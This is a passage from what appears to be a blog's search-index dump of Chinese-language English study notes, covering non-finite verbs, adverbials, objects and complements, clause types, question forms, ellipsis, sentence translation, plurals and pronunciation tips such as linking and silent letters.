不定式 to do 不确定 将来, 目的, 一次性 动名词 doing 确定 长期, 稳定, 习惯 分词–&gt;现在分词 doing 分身 与谓语动词同步发生 \\–&gt;过去分词 done(vi/vt) 省略 vi: 完成. vt: 完成, 被动 实例 I would like to come[come] to your party.(不定式) [smoke]smoking is bad.(动名词) I sat there, thinking[think] of her.(现在分词, 我坐在那里, [同时]想着它) I found her gone[go].(vi done, 我发现它走了) I found my bike stolen[steal].(vt done, 我发现我的自行车被偷了) 练习找出下面句子的谓语, 然后改正错误. Get up early is good for our health. analysis: is是一个系动词, 真正的谓语, 而Get up是长期的/习惯性的, 需要改成doing形式 amend: Getting early is good for our health. I want go home now. analysis: want是I产生的谓语, 而go home是不确定的/目的性的 amend: I want to go home now. My favorite sport is play football. analysis: 主系表结构, is才是谓语, play football是长期的 amend: My favorite sport is playing football. There is a bird sings in the tree. analysis: is是谓语, sings应该与它同步发生(现在分词) amend: There is a bird singing in the tree. The boy sits over there likes singing. analysis: sits属于定语, 修饰主语, 真正的谓语是likes, sits应该与likes同步发生 amend: The boy sitting over there likes singing. The house was built last year has been sold out. analysis: 谓语是has been sold out. was built限制The house, 属于后置定语, 而house与built是被动关系 amend: The house built last year has been sold out. My parents wanted him work hard. analysis: wanted是parents产生的谓语, work是不确定的 amend: My parents wanted him to work hard. I remember saw him that day. analysis: saw是did形式, do形式是see, 应该改为doing形式(确定) amend: I remember seeing him that day. 然而一个句子中是可以存在两个do的, 它还是代表一个谓语, 一个非谓语, 下面是老师的分析: 看见(谓语) 某人 做某事(非谓语) see sb 正在做—doing 做完了—to do 被做—done(vt) 要做 英语是一个严谨的语言, 看不到要发生的事. to do本质不确定, 折中后省略to表示做完了(整个过程). 例子 主动省to, 被动还原 主动: I saw her to go into the room. 被动(be+done): She was seen to go into the room. 英语的被动都偏向不确定(to do)","link":"/English/G/04-%E9%9D%9E%E8%B0%93%E8%AF%AD.html"},{"title":"05-副词与状语","text":"老师将主语(笼统)比作太阳系模型[同一角度下不断具体], 谓语比作摩天轮模型[不同角度进行描述], 有点意思. 状语adv修饰动词v, 形容词n, 副词adv, 或整个句子. 摩天轮模型说的就是修饰动词. 例子 He writes(V) carefully(adv). He runs(V) very(adv) slowly(adv).[slowly修饰runs, very修饰slowly] Unfortunately(adv), he lost all of his money. 特例: Unluckily, I got up very late today. Unluckily修饰整个句子, late修饰谓语, very修饰late, today修饰整句话或者动词 today也有adv 频度副词always总是, usually经常, often通常, sometimes有时, seldom很少, hardly(ever)几乎不 , never绝不 等.(主观上) 在句子中位于助动词, 系动词之后, 实义动词之前. 表达次数的方式 次数+时间: once a week 频度: often.. 例子 You can never tell what he will do. He is often late. He is always helping others. He often came late. 分类状语修饰动词, 于是将状语分类, 有时间, 地点, 原因, 目的, 结果, 程度, 条件(if then), 方式, 让步, 比较, 伴随(方式的同时又做别的事)等等 这就叫摩天轮模型, 有许多的状语类来修饰同一动词 练习: 下面划线部分是什么类型的状语. How about meeting again at six? 很明显, 这是时间状语 Mr. Smith lives on the third floor? 地点状语 Last night she didn’t go to the dance party because of the rain. 原因状语 She put the eggs into the basket with great care. great修饰care(程度), 但这整个状语实际上是方式状语 She came in with a dictionary in her hand. 她走进来的同时拿着一本字典, 伴随状语 方式与伴随状语 方式类似How, 怎么做的 伴随类似ing, 强调同时发生 To make his dream come true, Tom becomes very interested in business. 目的 The boy really needs a pen. 程度 He was so tired that he fell asleep immediately. so..that..如此..以至于..原因状语 She works very hard though she is old. 即便她老了工作也很努力. 这里的主观里老是最”糟糕”的情况, 给中青年让步了. 所以是让步状语 让步就是想说某种情况, 却说了与这个情况的对立面来反衬该情况(落差). 比如: 我爱你 就算世界毁灭我也爱你. 世界毁灭我都爱你, 更何况其他情况呢, 这就是对其他情况的让步 我不知道这解释你懂了没, 反正我是没懂..我都不知道我在说啥, 草 I am taller than he is. 比较 I shall go there if it doesn’t rain. 条件 Having to finish his homework, the boy needs a pen. 因为作业驱动男孩需要一支笔, 所以这是原因状语. 更深层次的理解状语类型 老师为了帮助理解状语, 加入了一个时间维度的模型—-行为 原因, 条件状语在行为之前发生 原因驱动行为 先有条件, 才有行为 目的, 结果状语在行为之后发生 这个行为 为了什么目的 行为的结果 其他类型的状语都发生在行为中","link":"/English/G/05-%E5%89%AF%E8%AF%8D%E4%B8%8E%E7%8A%B6%E8%AF%AD.html"},{"title":"06-宾语&#x2F;表语&#x2F;同位语","text":"不同常规的教学方法, 方便理解而不至于死记硬背 宾语 产生宾语的情况 谓语如果是实义动词 S+Vt1+O(动宾) I play football. S+Vt1+O+OC(Object Complement, 宾补) S+Vt2+IO(Indirect Object,间宾)+DO(Direct Object,直宾)[不好意思, 这么写真的是职业病] I told her a story. S+Vi+Preposition(介词)+O(介宾) 广义与狭义宾语之分 He is reading a book under the tree. 狭义上a book是宾语, 后面是状语 广义上a book是宾语, 介词后面也是宾语. 练习1: 判断宾语 I wanted to buy a car(O). to buy是不定式 I enjoy(vt) listening to popular music(O). to是介词, 介宾, listening是动名词, 组合起来才是真正的宾语 Look at the man(O). 祈使句, at是介词 I think (that) he is fit for his office. 句子做宾语, 叫宾语从句 双宾语之间宾直宾能有双宾语的句子需要满足三个条件 动词可以接两个主体(指间宾直宾) 这两个主体可以变序 有两个主体 不同的动词后面的两个宾语之间可能会有不同的介词 使用to连接间宾: allow, bring, deny, grant, hard, leave, lend, offer, owe, pass, pay, permit, read, refuse, sell, send, show, teach, tell, wish, write.等 S+V+IO+DO: She told me a joke. S+V+DO+IO: She told a joke to me. 使用for连接间宾: buy, choose, fetch, get, make, order, paint, play, save, sing, spare等 S+V+IO+DO: She bought me a book. S+V+DO+IO: She bought a book for me. 什么时候使用to, 什么时候使用for? 老师将它们分为参与与不参与的情况, 如told的过程需要me参与, bought的过程不需要么参与 具体什么时候使用for/to参考网站http://www.yygrammar.com/Article/201602/4751.html 宾语补足语例句: She made me sad. 对比双宾语: She told me a joke. 由此得到他们的不同点 宾补 双宾语 Vt1 Vt2 一个主体 两个主体(注意这两个主体是没有联系的) 不可变序 可以变序 补足语练习 His father named him(O) Dongming(OC). They painted their boat(O) white(OC). Let the fresh air(O) in(OC). We saw her(O) entering the room.(OC) You mustn’t force him(O) to lend his money to you.(OC) We found everything(O) in the lab in good order.(OC) analysis: in the lab是定语, 将everything缩小了, 而补语是对everything的补充, 不会将它缩小. I want your homework(O) done(OC) on time. We will soon make our city(O) what your city is now.(OC, 这是补语从句) 宾语从句句子作为宾语. 总共有以下五种宾语, 对应五种宾语从句 介宾: S+Vi+prep+O① I am thinking of what I can do. 动宾: S+Vt1+O② I think that you are pig 宾补:S+Vt1+O③+OC I think that we learn English well important. 间宾直宾: S+Vt2+IO④+DO⑤ I will give whoever comes first whoever he or she wants. 练习例句 We all think it a pity that she didn’t come here. analysis: it做形式宾语, a pity是宾补, that she didn’t come here是宾语 谓语如果是系动词老师将系动词+表语也分为了vi和vt两种(实际上没有, 这是为了方便理解) vi You are a good person. I am interested in it.(介词+宾) vt I am afraid(adj) that you are wrong.(这里类似宾补, that就是补语从句, 呈上所以有6种宾语从句) 补充知识主语补足语有宾语补足语的句子变成被动语态, 宾语变为主语, 宾补也变成了主补, 主补就是对主语的补充说明. eg: His father named him Rick(宾补). 转换成被动: He was named Rick(主补) by his father(方式状语, 通常省略). *更多主补句子* She was found singing in the next room. He was advised to teach the lazy boy a lesson. 表语在系动词后面就是表语. 判定是否主系表时, 将谓语动词换为be动词, 如果意思相近就是主系表 例句 Our teacher of English is an American. Is it yours?(it is yours) The weather has turned(系动词) cold. The truth is that he has nerver been abroad.(表语从句) 类型主语和宾语的类型只能是名词,句子, 而表语由形容词, 副词, 句子和介词短语充当 He is here. He is out. There be中文意思是：有 为了深入理解这东西, 需要知道两个背景知识 倒装—方位介词提前 主系表结构倒装既是完全倒装也是不完全倒装 接下来将一个主系表句子倒装 A book is on the desk. 倒装: On the desk is a book. 这样就”头重脚轻”了, 在主谓宾的倒装句子中, 使用it作形式主语/宾语, 因为it是带名词性的, 但On the desk不同, 它是介词短语(介词+名词), 所以不能用it, 那用什么? 没错, 就是There! There be: There is a book on the desk. There是形式表语, on the desk是表语 be与后面的主语人称和数要一致, 有时态和数的变化. 现在时: there is/are… 过去时: there was/were.. 将来时: there will be../there is/are going to be.. 完成时: there has/have been.. 可能有: there might be.. 肯定有: there must be../there must have been.. 过去曾经有: there used to be.. 似乎有: there seem/seems/seemed to do.. 碰巧有: there happen/happens/happened to do.. 可用 live, stand, come, go, lie, remain, exist, arrive 等词代替be动词, 表意更具体 There lived an old man at the foot of the mountain. There came a shout for ‘help’.(V+S, not P) There exists on air on the moon. There lies a book on the desk. There stands a tree on the hell. 同位语将两个名词放在主语or宾语位置上, 这两个地位同等 Shepherd, a 19-year-old boy, is a bad student we all love you. 区分宾补,定语,同位语 同位语 宾补 定语 词性 只能是名词 名词, 形容词, 介词, 副词, 不定式, 现在分词, 过去分词 副词, 形容词, 介词, 不定式, 现在分词, 过去分词 顺序 可变可不变 不能变序 可以变序 范围 不变 不变 缩小 同位语VS宾补同位语: I love him Morty.(这个Morty===him) 宾补: His father named him Morty.(Morty属于him, him还有其他很多东西) 宾补VS后置定语宾补: I saw the boy playing basketball.(playing basketball只是the boy的一个角度, 这里明确了the boy) 后置定语: The boy playing basketball is Tom.(the boy是一个笼统的词, 定语将它范围缩小了) 同位语VS后置定语同位语: Tom, a student, studies hard. 非限制后置定语: Tom, who is a student, studies hard. 一句话理解: I think the boy playing basketball(后置定语), Tom(同位语), handsome(OC).","link":"/English/G/06-%E5%AE%BE%E8%AF%AD.html"},{"title":"07-句子","text":"前面的学习是为了构成句子, 学完句子才能写文章. 加油! 简单句 简单句不一定简单哦 简单句抽象SV: S+V; S, S and S +V; S + V, V and V; S, S and S + V, V and V. 不管多少个S, V, 如果使用and连接, 都只能算一个大S, V(区别并列句) 五大基本类型 S+V S+Vi: Birds fly. S+V+O S+vi+prep+O: I look at the man. S+Vt1+O: I love you. S+V+O+OC S+Vt1+O+OC: I think you beautiful. S+V+IO+DO S+Vt2+IO+DO: she told me a joke. S+Vt2+DO+IO: she told a joke to me. S+C+P He is a student. I am a man. 助动词不管有多少, 都看成一个大V 并列句SV&gt;=2, 由并列连词连接 I love you and you love me. 抽象: S+V+连词+S+V…(连词个数=SV个数-1) 这些连词主要有: and, but, or, so, ;.. 连词两边都必须有SV, 才能算是并列句(区别简单句) 例子 You help him and he help you. The futrue is bright; the road is tortuous. 表示同等关系(并列, 平行)常用and, not only…but also.., neither..nor…等连接 He not only stole my money, but he also took my watch away. 表示选择关系常用or(否则), otherwise等 Hurry up, or you’ll miss the train. 表示转折关系常用but, yet, while, when等. 表示因果关系so等 August is the time of the year for rice harvest, so every day I work from dawn until dark. 复合句(从句)从句1.0有多个SV, 由从属连词连接, 但连接顺序并不像并列句, 可以有以下顺序 S+V+连词+S+V 连词+S+V+S+V S+连词+S+V+V等等 从属连词有that, which, what, when, where, why, how, whether, if, because, as, since, although, whatever…. 使用句子作为某句子的一些成份，这个句子叫从句 It is right. What(O) he(S) said(V) is right 分析: what is said相当于it, 是名词性从句，可以充当主从，宾从，表从，同位从等 The boy under the tree is Tom. The boy who(S) is reading(V) a book(O) is Tom. 分析: 将定语换成了句子, 定语从句, 词性是形容词性的, 也叫形容性从句, who既是从属连词, 也是主语 I was doing my homework at six. I was doing my homework when he called me. 分析: at six是时间状语, when是连词, 所以叫状语从句, 又因为状语是副词性的, 所以也叫副词从句. 通过上面分析 从词性角度来说, 分为名词性, 形容词性, 副词性 从句子成分来说, 分为主宾表同定状从等等 判断从句2.0 一个句子有多个动词时, 看连接词是否是从属连词 eg: I help you and you help me. –&gt;并列句 I help you because you helped me.–&gt;从句 详细解释从属连词 位置: 连接词位于从句句首 个数: V-1 作用 引导从句 在从句中做成分 省略(后面解释) 2.0总结技巧 引导词是从句开端 根据句意判断结尾(看运气) 两个V不属于同一个句子 通过以上知识划分主从句 例子: (What you said) 主从 / is right. I don’t know / (what you talk about(V))宾从 It is / (what it is)表从. The boy / (who is wearing a hat)定从 / is my brother. I was doing my homework / (when she came back)状从. We all know the fact / (that you are pig)同为从. 判断从句3.0通过一个公式判断所有从句 1234567 /` 定: 修n /`主句完整- 状: 修V / \\- 同: 完整,抽象,等同V&gt;=2 &amp;&amp; 从属连词 ==&gt; 复合句 \\ /` 主: 引导词开头无',' or it形式主语 \\-主句不完整- 宾: vt1后,介词后,vt2+IO后,it形式宾语 \\ 表: 系动词+引导词后 同位语从句 完整: 主句完整 抽象: 主句中有抽象名词(promise, fact, news…) 等同: 从句==抽象名词(如前面的fact==that you are pig) 如何判断抽象名词? 答: 比如promise(承诺), fact(事实). 举个例子, 我答应你是一个承诺, 我爱你也是一个承诺. 举个反例, 我买了一个桌子是桌子吗? 这就是抽象和具体的解释. 同位从VS定从 相同点 不同点 主句完整 同为从必须是抽象名词, 定从可以是抽象/具体 都可使用that引导 同位从从句与抽象名词等同, 定从不等同 同位从that不作成分, 定从作成分 e.g: Do you remember the promise that you will love me forever? 同位语从句, that引导, 等同抽象, 且that不作成分 Do you remember the promise that you made last year? 定语从句, promise!=that you made last year. that在从句中代表promise 作业where引导的从句练习 You can find it where you left it. 分析: 主句完整, 定状同, 根据句意在丢下它的地方去找它==&gt;状从. Tell me the address where he lives. 分析: 省略主语You, me是IO, the address是DO, 句意他居住的地方==&gt;定从 I don’t know where he comes from. 分析: know is vt(与生活的I don’t know不同), 缺少宾语==&gt;宾从 Where he was born is not known yet. 分析: is not known是谓语, 前面缺主语==&gt;主从 This place is where they once lived. 分析: 但一个is是动词, 缺少宾语/表语, 句意曾居住的地方==&gt;表从 I have no idea where the party is to be held. 分析: 主句完整, 看名词idea, 是抽象名词, idea==the party is to be held==&gt;同位从","link":"/English/G/07-%E5%8F%A5%E5%AD%90.html"},{"title":"08-特殊句子","text":".. 感叹句感叹句一般由whatandhow开头 分析what和how在句中的词性 What do you want? what作名词 What color do you want? what作形容词 How do you come here? how作副词修饰动词 通用公式 What(adj)+名词短语+[主+谓] What a good boy he is! What good boys they are! What good news it is! What good weather! How(adv)+V/adv/adj+[主+谓] How good the boy is! How fast he runs! what修饰人和物, how修饰一种属性 祈使句特点: 省略S [You] shut up! [we] let’s go! Do开头 Please sit down! be quiet! 表达命令/要求/建议 help! be careful! 天然表将来 open the door! 疑问句一般疑问句公式: 助动词 &gt; 系动词(be) &gt; 抽象出的狭义助动词(除be+实义动词) + 主语 + 其他? 实义动词 He plays football every day.–&gt;Does he play.. You play football every day.–&gt;Do you play… He played football yesterday.–&gt;Did he play.. does, did 后接动词原型 系动词 He is student–&gt;Is he a student? You are a student–&gt;Are you a student? They are students–&gt;Are they.. It sounds interesting–&gt;Does it sound interesting? They bacame friends–&gt;Did they bacome friends? He seems right–&gt;Does he seem right? 助动词+实义 He is fired–&gt;Is he fired? He can speak English–&gt;Can he speak English? He did play football yesterday–&gt;Did he do play …(表示强调) He has become a college student–&gt; Has he become.. 助动词+系动词 He is being a man–&gt;Is he being a man? He is a man. He is being a man. being有暂时性,变得,这次的意思 We are becomging friends–&gt;Are we becomeing friends? Leo can be the one–&gt;Can leo be the one? 一般疑问特殊情况 There be.. –&gt; be there.. some | any I have something to say –&gt; Do you have anything to say? Would you like something to drink?(表示真诚的) 不确定回答 | 肯定回答 Is he a man? Isn’t he a man? 回答: yes, he is/ no, he isn’t 反义疑问句 反义疑问句表示提问人的看法, 没有把握, 需要对方赞同. 回答yes or no. 规则: 前肯后否, 前否后肯 构成形式抽象: 完整句子, 助/系 主语(人称代词) [实义动词抽象成狭义助动词] there be句子主语用there. 当主语是一个句子时, 用it代 祈使句使用 will you?/shall we? 例1: He can speack English, can’t he? He is a good student, isn’t he? Lily speaks good English, Doesn’t she? Tom can hardly(否定) speak English, can he? 例2: There is car in the park, isn’t there? What he said(S) is right, isn’t it? 例3: [You] shut up, will you?/won’t you? [We] let’s go, shall we?/shan’t we? 祈使句天然表将来 选择疑问句回答从问题里面二选一. 特殊疑问句 具体提问, 具体回答 代词词性 名词: what,which,who,whom 形容词: what,which,whose 副词: when,where,why,how What what做宾语: you want a cat. –&gt; What do you want? 疑问句相当于部分倒装, 谓语要提前 , want要用do代表 what做表语: Your problem is your face. –&gt; what is your problem? what做定语: You want size 5. –&gt; What size do you want? what做主语: All work and no play makes Jack a dull boy? –&gt; What makes Jack a dull boy? Which what与which的主要区别就是, 前者没有确定范围, 后者在确定范围里具体选择 which做宾语: You want the red one. –&gt; Which do you want? 做表语: My choice is the red one. –&gt; Which is your choice? 做定语: You are in class 5. –&gt; Which class are you in? 做主语: The red one is better. –&gt; Which is better? Who 主语: Jay is my favorite singer. –&gt;Who is your favorite singer? 主语: Jay makes the best music. –&gt; Who makes the best music? whom(谁) whom只能做宾语. who与whom的区别就是who做主语, whom做宾语. 在日常口语中不常见, 只在书面中存在 I choose Jay. –&gt; whom do your choose? whose(谁的,adj) I will join Jay’s team. –&gt; Whose team will your join ? 有助动词提前助动词 Jay’s music is the best. –&gt; whose music is the best? When(几时),Where(何处),Why(为何),How(怎样) [adv] I came here at 8:30. –&gt; when did you came here? I came here by bus. –&gt; How did you came here? I came here to meet her. –&gt; Why did you came here? I will meet her at the gate. –&gt; Where will you meet her? I exercise three times a week(一周三次). –&gt; How often do you exercse? I waited for him for 3 hours. –&gt; How long(多长时间) did you wait for him? He will come back in an hour. –&gt; How soon(还要多久) will he come back? My house is three miles form the supermarket. –&gt; How far(距离多远) is your house form the supermarket? 总结 疑问词不作主语–特殊疑问词+一般疑问句语序 作主语–不变序 有助动词提前助动词, 有be动词提前be动词, 其他情况抽象成狭义助动词 强调句公式: it is/was + 强调部分 + that/who(人)/whom(人,宾语) + 其他 例子: 原句: She told me a joke in the classroom yesterday afternoon. 强调she: It is/was she that/who told me a joke in the classroom yesterday afternoon. 强调me: It is/was me that/who/whom she told a joke in the classroom yesterday afternoon. 强调a joke: It is a joke that she told me in the classroom yesterday afternoon. 强调in the classroom: It is in the classroom that she told me a joke yesterday afternoon. 强调told: She did tell me a joke in the classroom yesterday afternoon. 改装原句: She told a joke to me in the classroom yesterday afternoon. 强调a joke: It is a joke that she told to me in the classroom yesterday afternoon. 强调me: It is to me that/who/whom she told a joke in the classroom yesterday afternoon.","link":"/English/G/08-%E7%89%B9%E6%AE%8A%E5%8F%A5%E5%AD%90.html"},{"title":"09-高级语法及技巧","text":".. 被动即完整将句子改为被动, 主语就变成了方式状语, 可要可不要. eg: We cleaned the room. The room was cleaned [by us]. 间宾被动除外(缺少直宾不完整). 省略省略掉重复的但不会产生歧义 eg: Do you known Linux? I don’t know [Linux]. know是及物动词, 但平常都是省略宾语的用法. eg: I don’ t know what I should do.(what做宾语成分) 省略: I don’t know what to do. I don’t know how I should do it.(how是副词词性) 省略: I don’t know how to do it. 解析: 省略主语后, 不能使用谓语形式, 需要转为非谓语, 而should do和to do都表不确定, 所以使用to do替换should do. 判断连词!=1的情况 从句与从句形成并列关系(多了一个并列连词) 找错谓语(过去分词是非谓语, 表被动) 找错连接词(that man is good) 省略(下面重点讲) 省略连词 据morty老师分析, 当句子成分非常明显则可以省略连词 宾从第一个that I think [that] you are good and that you are beautiful. 定从的关系代词(连接词)做宾语 The book [that] I bought yesterday is good. 定从的先行词是the way+从句完整时, 引导词可以用that/in which/省略 I like the way [that/in which]/ ] you like lie. 反向找省略连接词 因为连词位于从句句首, 连词要么充当主语, 要么不充当, 通过从句的动词可以分析省略的连词 简单来说从句分为两类 引导词+V+其他 引导词+S+V+其他 eg: I think(v) [that] he is(v) right. This is(v) the park [that/which] we visited(v) last week. 句首的引导词不可省略 3大难点 主从: [引导词]+S(句子)+V eg: I think what you did id of help. 分析: of help==helpful,be of use==be useful 3个v, think, did(后接原型), is, 说明有2个连接词 但是只有what. is的主语是what you did 所以I think后面省略了一个连接词that 主谓相隔: [引导词]+S+后置定语+V eg: I think the boy wearing a green hat is pig. 分析: wearing a green hat是后置定语 think后面是宾语从句, 后面缺少一个连接词that 主语前有状语: [引导词]+状语+S+V eg: I think(v) form the beginning you are(v) a good. 分析: form the beginning是状语, 修饰动词或者整个句子 它在从句主语you前面, 所以think后省略了一个连接词that","link":"/English/G/09-%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95%E5%8F%8A%E6%8A%80%E5%B7%A7.html"},{"title":"10-翻译句子","text":"总结一句话就是把后置定语和除目的,结果,伴随的状语调到所修饰的词的前面 需要注意的是SVO后面可以接OC, DO, 后置定语, 状语, 同位语. 要根据语境具体分析 eg: You should put your things in order. 分析: in order是things的一个方面, 是OC. (考虑过in order put, 虽然能说通, 但句意上它是OC) 翻译: 你应该把你的东西放整齐. To swim in Kunming lake is great pleasure. 分析: To swim是S, in kunming是地点状语, is是v, 后面是P 翻译: 在昆明湖游泳是很快乐的事. Lihua showed me how to oprate the computer. 分析: to oprate不是谓语, 这是一个简单句, show是vt2, 接IO(me)+DO. 翻译: Lihua向我展示了怎样操作电脑. Her mother often goes out to go shopping on Sunday. 分析: often频度副词, goes out谓语(vi), 外出的目的是go shopping, to go shopping是目的状语, on Sunday是时间状语 翻译: 她妈妈经常在星期天出去购物. He sat there reading a novel that I lent him last Sunday. 分析: there是adv词性, 修饰sat(vi), reading a novel是伴随状语, that后面是定从, lent后接双宾语, that做DO成份 翻译: 他坐在那(在那坐着)读着一本我上个星期天借给他的小说. ^Yesterday the scientist made a report on modern science for us. 分析: 看到for&amp;to就要想到是不是双宾语, made是vt2, a report是DO, for us是IO, on modern science是后置定语 翻译: 昨天科学家制作了一份关于现代科学的报告给我们. 看到for sb/to sb就要想到双宾语 on在这里代表关于, on是很官方的, about是一般的 I don’t believe that story true. 分析: don’t believe 是宾语, that story 是宾语, true是adj词性, 排除同位语, 状语和DO, 故事真的, 是故事的一个侧面, 所以代表true是OC, 不是后置定语 翻译: 我不相信这个故事真的 We saw the students of class one playing basketball on the playground happily. 分析: of class one 是后置定语, playing basketball 是OC, on the playground 是地点状语, happily是程度副词. 翻译: 我们看到一班的同学在操场上开心的打篮球. Comrade Li stood up and spoke at the close of the meeting. 分析: 这是一个简单句, stood up and spoke是一个大V, at the close是时间状语–结束时, of the meeting做后置定语, 修饰限定the close- 翻译: 李同志在会议结束时站起并讲话 It was a pity that you didn’t watch that wonderful football match. 分析: it做形式主语, 真的主语在that后面, 第二个that后面是名词短语 翻译: 你没有看那场精彩的足球比赛是一个遗憾. We should do something to help the comrades in difficulties. 分析: 当主句完整时(to do优先考虑目的状), 也要注意something这个不定代词极有可能接后置定语, in difficulties是后置定语 翻译: 我们应该做一些事去帮助那些有困难的同志 You had better answer the question in English. 分析: had better助动词, answer(vt), in English是方式状语, 修饰answer 翻译: 你最好用英语回答这个问题.","link":"/English/G/10-%E7%BF%BB%E8%AF%91%E5%8F%A5%E5%AD%90.html"},{"title":"G001","text":"名词的数 名词可数 单数: coats, jobs, hats 复数 规则 +s (s|x|ch|sh)$: +es [^aeiou]y$: sed -r s/y$/ies/ o (potato|tomato): +es (photo|zoo): +s (f|fe)$: sed -r s/(f|fe)$/ves/ 不规则 单复同形 完全不规则 只有复数 不可数air, water… 可数名词复数不规则表单复同形 word plural finsh finsh/finshes Notes: 同一种类型的鱼使用 finsh 完全不规则 word plural man men child children foot feet 只有复数 word plural people people police police","link":"/English/G/G001.html"},{"title":"G002","text":"be 动词的数 I: am, am not He/She/It: is, isn’t You/They: are, aren’t","link":"/English/G/G002.html"},{"title":"动词不规则变化整理","text":"不规则整理 ABB do did done mean offer offered offered 提供 clean cleaned cleaned 清扫 tell told told 告诉 sit sat sat 坐 stand stood stood 站立 ABA do did done mean become became become 成为 ABC do did done mean choose chose chosen 选择 speak spoke spoken 说","link":"/English/G/%E5%8A%A8%E8%AF%8D%E4%B8%8D%E8%A7%84%E5%88%99%E5%8F%98%E5%8C%96%E6%95%B4%E7%90%86.html"},{"title":"小知识整理","text":"英语小知识，自己的理解心得 of和for的区别of一般代表什么的什么, for代表为了什么, 但在短语里面意思也会不大一样 eg: I bought a gift formy mother. 我为妈妈买了一个礼物 The ways of learning English. 学英语的方法 I have doing homework for two hours. 什么时候用are主语为第三人称单数（如he, she, it, Tom, Mary等）时用is，主语为复数（we, they, you， Tom and Mary等），或第二人称单数（you）时，都用are 什么时候用does当你找到了句子中的动词,就知道它的疑问形式和否定形式要使用do或does(主语是第一人称I,第二人称you,及其他的复数名词、人称代词时,要选用do;主语为第三人称单数时,选用does.)如果句子中没有动词,只有名词或形容词,就要使用am\\is\\are了. 动词的5种形式https://zhuanlan.zhihu.com/p/57203501","link":"/English/G/%E5%B0%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86.html"},{"title":"短语整理","text":"英语短语 短语 意思 fond of 喜爱 neither…, nor… 既不..也不.. by no means 绝不 go on 继续 stand up 起立 how do you do 你好吗？","link":"/English/G/%E7%9F%AD%E8%AF%AD%E6%95%B4%E7%90%86.html"},{"title":"How to learn English?","text":"code: 1summary: Note by YaYo, refrence for Morty 12345678+-----------+ +------+ +---------+ +-----------+| listening +--&gt;+ talk +--&gt;+ imitate +--&gt;+ translate |+-----------+ +------+ +---------+ +-----+-----+^ || v| +--------+ +-----------------------+-----++-------+ review |&lt;----+ get new words to dictionary | +--------+ +-----------------------------+ Translate Learn by heart Read a sentence, translate a sentence :star: Sight translation Review Small amount, many times Forgetting curve :star: Match the original text Don’t write Chinese Step learning Be patient, and all the hard work will eventually pay off.","link":"/English/M/How-to-learn-English.html"},{"title":"8-14口语笔记","text":"造就完了 连续发音分析to一般发/t/ 在元音之间发闪音 way to go.干的漂亮 I can’t go to the dance with my borther. go to bed. to,do,you,know,go他们后面有w的音，如果后面接元音会连读 Do it. What’s going on? go(w) on.(做w的口型连过去) You’ll go(w) off. Talk to(w) him. see you(w) again. yellow apple. we are音似were We’re here. While we’re at it.既然我们那样做了 we are not. hundred两个音：hundred,hundred hundred bucks. 5 hundred bucks eight hundred bucks. T+you强调可以读you，念快了读ʧu look at you D+youyou读jiu I don’t need you. see ite+i连读发yer see it. 发音规律L首部/le/ light lemon leg lion leapt luscious美味的 末尾/e/ you’ll go off. 当l结尾后面接元音时，又会发/le/ telling I will allways love you. stole it. Cause I’m all about the learnin. I’ll tell her we’re leaving. R首部时，嘴做圆形 Rockin Robot 做结尾，和l差不多 t,d,p,k,g,b,f,v,m,n这几个音相遇要省略前一个 Is it too soon. nice suit.(发音一样) What do you want. Can’t you talk to(w) her So what do i do? How do I talk to her. Say something to her. I can’t get mommy and daddy back together. bad dog.","link":"/English/O/8-14.html"},{"title":"1-7口语笔记","text":"此分类笔记参考淘宝浆糊老师的课程. T1.n后面的t不发音 You weren’t there.你不在那里 Are’t there all?不存在？ I do what I want.我做我想做的 It’s too hard, I can’t do this. You can do it.(t不发音) You can’t park here. Get me the president.(Get&amp;president的t都不发音) Ladies and gentlemen! 2.t+元音+n,t不发音 Have you eaten? Look behind the curtain. Written can’t be unwritten. It’s written in blood. mountain It’s importent business.(两个t都不发音) 3.t+ly,t不发音 Lately,不久前 Completely,完全的 Absolutely,当然啦 Definitely,绝对的 Exactly,必须的 4.s+t结尾,t不发音 You just need to believe. Best day ever Last Christmas. First day. Must know. 5.句子结尾 I can do that. I can’t do that. D1.n+d,d省略 friend grandma 闪音把t,p,k叫作闪音，因为它们在某些条件下发的是d,b,g的音，下面元音指的是发音是元音 1.元音+闪音+元音 water–&gt;wader open–&gt;oben making–&gt;maging daughter matter woke up broke up shut up 2.s+闪音+元音 sky speak school student You are making a mistake. What are you doing. What are you gonna do?接下来你要做什么 going to–&gt;gonna(口语) What do you think?你怎么想 What are you thinking?此时此刻你怎么想 What are you looking at? happy 在s与元音中间直接就是闪音，在元音与元音之间的说的慢就不是闪音 H句子中间的h不发音注意，是句子中间开头为H单词，当它为句子开头时不能省 Where is he? Who is he? Does he have girlfriend? He doesn’t want to talk to me, does he?他不想和我说话，对吗？ You didn’t hear what he said.你没听到他说什么 What’d he just say.他刚才说了什么 Why does he keep saying that.他为什么这么说啊 What did he do?(当需要强调时，语气很慢，可以不省略) What’d he do？ And he’s my brother. Did he talk a lot about yogurt? Where did he get that wine? Where did he come from? Where’d he go? I’m gonna ask her. Punch him.搞他 R当r后面没有元音时，发卷舌音 car park hard People are gonna love her. Sounds like it’s coming from the back of the car. 当r后面有元音时，不发卷舌音 The baby’s absolutely adorable. Now get her out of here. I hear it too. TH这是一个咬舌音，我们平常没有咬舌音，这个需要多加练习 /θ/：咬舌发出s音 think thank I thought it was “I made yogurt”. /δ/：咬舌发出z音 this that That’s what confused me. Do you see them. 省略th发音的情况(通常说的快都会省略) What’s that supposed to mean? I understand that. You’re gonna love them. I put them in this hat. Hang in there. We got them now. 容易发错的音re音标是/ri/,口语发‘re’ relationship remember ofo发ae的音，f不发音 kind of kind of have some big news.有一点大事 I’m kind of good.我这个人不错 I’m kind of busy.我有点忙 I’m kind of hungry.我有点恶了 I’m kind of broken.我差不多破产了 I’m kind of curious.我有点好奇 out of 发音–&gt; oudda Let’s get oudda here.我们逃出去 lot of –&gt; lodda And a lodda people. must have I musta given him yours.我肯定把你的给他了 You musta moved. 其他 because实际发音Cause and –&gt; n Prok and Roll for –&gt; fer Wait for me. something 念的快–&gt;some n(不会音标，将就着写) Something bothering you？ I got something for you. you(U) are(R) –&gt; (较快)you r –&gt; (最快)yer You are right. That’s why you are my favorite. you在t后面发cha的音 Don’t you know. But you are girl. you在d后面发jiu Would you mind? ing 发音 n What are you doing. –&gt; (快)What you doing. value –&gt; val u failure(u发音yer,所以l不连读过去) –&gt; fail yer The + 元音开头发 /δi/ 但是the 